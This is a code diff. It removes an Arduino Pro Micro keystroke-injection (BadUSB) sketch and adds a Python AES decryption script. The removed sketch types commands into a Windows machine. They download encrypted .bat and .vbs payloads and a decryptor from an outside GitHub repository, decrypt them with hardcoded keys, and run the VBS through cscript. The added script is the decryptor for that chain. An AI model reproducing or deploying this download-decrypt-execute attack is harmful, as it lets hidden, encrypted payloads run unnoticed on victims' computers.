@@ -1,86 +1,48 @@
-#include <Keyboard.h>
+import sys
+import subprocess
+import importlib.util
 
-// Hidden credentials for decryption
-const char* password = "YourPassword";  // Replace with your actual password
-const char* salt = "a726d3cd829c72204ae1add61be23ffa";
-const char* iv_bat = "c835c64d5b9d758fd29823f7ee855801";
-const char* iv_vbs = "d990fa53364de877296723a207f91ac5";
+# Function to install packages
+def install(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
-// URLs to encrypted files, Python script, and requirements.txt
-const char* url_bat = "https://github.com/techsingkillmonger/test/raw/refs/heads/main/encrypted_script_bat.enc";
-const char* url_vbs = "https://github.com/techsingkillmonger/test/raw/refs/heads/main/encrypted_script_vbs.enc";
-const char* url_python = "https://github.com/techsingkillmonger/test/raw/refs/heads/main/decrypt.py";
-const char* url_requirements = "https://github.com/techsingkillmonger/test/raw/refs/heads/main/requirements.txt";
+# Check if pycryptodome is installed
+package_name = 'pycryptodome'
+spec = importlib.util.find_spec('Crypto')
+if spec is None:
+    print(f"Installing {package_name}...")
+    install(package_name)
 
-void setup() {
-  Keyboard.begin();
-  delay(5000); // Delay to ensure the system is ready
+from Crypto.Cipher import AES
+import hashlib
+import os
 
-  // Open CMD
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  Keyboard.releaseAll();
-  delay(500);
-  Keyboard.print("cmd");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(1000);
+def decrypt_file(input_file, output_file, password, salt_hex, iv_hex):
+    salt = bytes.fromhex(salt_hex)
+    iv = bytes.fromhex(iv_hex)
 
-  // Navigate to Desktop
-  Keyboard.print("cd %userprofile%\\Desktop");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(1000);
+    # Derive the AES key from the password and salt
+    key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000, dklen=32)
 
-  // Download encrypted files, decryption script, and requirements.txt
-  Keyboard.print("curl -L ");
-  Keyboard.print(url_bat);
-  Keyboard.print(" -o encrypted_script_bat.enc && curl -L ");
-  Keyboard.print(url_vbs);
-  Keyboard.print(" -o encrypted_script_vbs.enc && curl -L ");
-  Keyboard.print(url_python);
-  Keyboard.print(" -o decrypt.py && curl -L ");
-  Keyboard.print(url_requirements);
-  Keyboard.print(" -o requirements.txt");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(5000); // Wait for downloads to complete
+    with open(input_file, 'rb') as f:
+        ciphertext = f.read()
 
-  // Install Python requirements
-  Keyboard.print("python -m pip install -r requirements.txt");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(5000); // Wait for installation to complete
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    plaintext = cipher.decrypt(ciphertext)
 
-  // Run Python script to decrypt files
-  Keyboard.print("python decrypt.py encrypted_script_bat.enc deletesc.bat ");
-  Keyboard.print(password);
-  Keyboard.print(" ");
-  Keyboard.print(salt);
-  Keyboard.print(" ");
-  Keyboard.print(iv_bat);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(3000); // Allow time for decryption
+    # Remove padding (PKCS7)
+    padding_len = plaintext[-1]
+    plaintext = plaintext[:-padding_len]
 
-  Keyboard.print("python decrypt.py encrypted_script_vbs.enc test.vbs ");
-  Keyboard.print(password);
-  Keyboard.print(" ");
-  Keyboard.print(salt);
-  Keyboard.print(" ");
-  Keyboard.print(iv_vbs);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(3000); // Allow time for decryption
+    with open(output_file, 'wb') as f:
+        f.write(plaintext)
 
-  // Run the decrypted .vbs script
-  Keyboard.print("cscript test.vbs");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
+if __name__ == '__main__':
+    # Arguments passed from Pro Micro: input file, output file, password, salt, iv
+    input_file = sys.argv[1]
+    output_file = sys.argv[2]
+    password = sys.argv[3]
+    salt = sys.argv[4]
+    iv = sys.argv[5]
 
-  Keyboard.end();
-}
-
-void loop() {
-  // Nothing in loop
-}
+    decrypt_file(input_file, output_file, password, salt, iv)
